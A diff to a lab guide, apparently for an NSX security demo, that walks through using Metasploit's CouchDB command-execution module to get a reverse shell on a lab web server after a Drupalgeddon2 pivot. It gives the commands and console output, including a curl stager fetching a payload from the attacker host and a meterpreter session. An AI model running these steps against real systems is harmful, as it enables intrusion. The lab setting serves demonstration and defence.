@@ -577,7 +577,7 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
     * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
     * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
-    * Type **set LPORT 4445** to define the local port to use.
+    * Type **set LPORT 4445** to define the local port to use. The reverse 
     * Type **exploit** to initiate the exploit and esbalish a command shell
 ```console
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
@@ -590,6 +590,31 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
 LPORT => 4445
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
+2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App1-WEB-APP VM** back to the **Extermal VM**
+```console
+[*] Started reverse TCP handler on 10.114.209.151:4445
+[*] Generating curl command stager
+[*] Using URL: http://0.0.0.0:8080/l8sEqcccZNK
+[*] Local IP: http://10.114.209.151:8080/l8sEqcccZNK
+[*] 192.168.20.100:5984 - The 1 time to exploit
+[*] Client 10.114.209.148 (curl/7.38.0) requested /l8sEqcccZNK
+[*] Sending payload to 10.114.209.148 (curl/7.38.0)
+[*] Command shell session 2 opened (10.114.209.151:4445 -> 10.114.209.148:50665) at 2020-07-22 08:48:51 -0500
+[+] Deleted /tmp/jekukcmc
+[+] Deleted /tmp/okmyzfondlujy
+[*] Server stopped.
+```
+6. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
+    * Type **sysinfo** to learn more about the running OS
+
+```console
+meterpreter > sysinfo
+Computer    : 273e1700c5be
+OS          : Linux 273e1700c5be 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
+Meterpreter : php/linux
+meterpreter > ?
+```
+
 
 
 
